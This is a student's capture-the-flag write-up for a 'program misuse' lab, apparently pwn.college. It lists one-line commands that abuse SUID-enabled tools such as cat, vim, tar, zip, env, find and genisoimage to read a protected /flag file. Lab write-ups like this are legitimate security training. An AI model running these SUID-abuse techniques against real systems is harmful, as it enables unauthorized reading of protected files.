This module shown me a lot of common command tools.

# lvl 1~22
> Lets you directly read the flag!
### lvl 1
Remember to run `/challenge/babysuid` first.
`/challenge/bin/cat /flag`

### lvl 2
`/challenge/bin/more /flag`

### lvl 3
`echo $(/challenge/bin/less /flag)`

### lvl 4
`/challenge/bin/tail /flag`

### lvl 5
`/challenge/bin/head /flag`

### lvl 6
`/challenge/bin/sort /flag`

---
> Shows you that an over-privileged editor is a very powerful tool!
Remember to use `man`.
### lvl 7
I like vim. Use `:q!` to quit.  
`/challenge/bin/vim /flag`

### lvl 8
I haven't use emacs. But I know `ctrl+z`.  
`/challenge/bin/emacs /flag`

### lvl 9
nano is good.  
`/challenge/bin/nano /flag`

---
> Requires you to understand their output to derive the flag from it!
### lvl 10
`/challenge/bin/rev /flag | /challenge/bin/rev`

### lvl 11
regex is helpful.  
`/challenge/bin/od -c /flag | perl -pe 's/\s|^\d*//g'`

### lvl 12
`/challenge/bin/hd /flag | perl -pe 's/^.*?\|//g; s/\|\s$//g'`

### lvl 13
It's good not to use regex.  
`/challenge/bin/xxd /flag | xxd -r`

### lvl 14
`/challenge/bin/base32 /flag | base32 -d`

### lvl 15
`/challenge/bin/base64 /flag | base64 -d`

### lvl 16
`/challenge/bin/split /flag` and the flag is at a file named `xaa`, so `cat xaa; rm $_`.

---
> Forces you to understand different archive formats!
But I can always trust vim. It can open `.zip`, `.a`, `.tar` files, etc.
### lvl 17
`/challenge/bin/gzip /flag -c | gzip -dc`

### lvl 18
`/challenge/bin/bzip2 -c /flag | bzip2 -dc`

### lvl 19
I can't find better one-line writeup.  
`/challenge/bin/zip draft.zip /flag && unzip draft.zip && cat flag && rm draft.zip flag`

### lvl 20
`/challenge/bin/tar -cf tmp.tar /flag && tar -Oxf tmp.tar && rm tmp.tar -f`

### lvl 21
`/challenge/bin/ar r tmp.a /flag && ar p tmp.a && rm tmp.a -f`

### lvl 22
`echo "/flag" | cpio -o`

# lvl 23
Untill now I know that .iso file is just a common archive of files, which can be opened by winrar.

This is really a big challenge.
I just readthe all content in the man page of `genisoimage` and find nothing to get the flag.

When I input `/challenge/bin/genisoimage /flag`, only this comes up:
```err.log
hacker@program-misuse~level23:~/program_misuse$ /challenge/bin/genisoimage -o tmp.iso /flag
/challenge/bin/genisoimage: Permission denied. File /flag is not readable - ignoring
```

I think it's impossible for me to just read the man page to find the resolution.

Finally I go to find the answer on github.
I find a senior who took cse466-f2023.
He/She used `strace` to find that the process of `genisoimage` automatically change its eUID.

And I implement it:
```sh
hacker@program-misuse~level23:~/program_misuse$ strace /challenge/bin/genisoimage /flag 2> out.log
hacker@program-misuse~level23:~/program_misuse$ cat out.log | grep uid | head
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
getuid()                                = 1000
setreuid(-1, 1000)                      = 0
getuid()                                = 1000
```
Maybe it's because there is no suid-debug file so the process can't set eUID to 0.

And the senior used brute force to complete.
```
for op in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'); do /challenge/bin/genisoimage $op /flag; done 2>&1 | grep pwn.college
```

---
> Enables you to read flags by making them execute other commands!

### lvl 24
`env` display or change the environment variables.
`/challenge/bin/env -i cat /flag`

### lvl 25
The answer is told in the video.
`find /flag -exec cat '{}' \;`
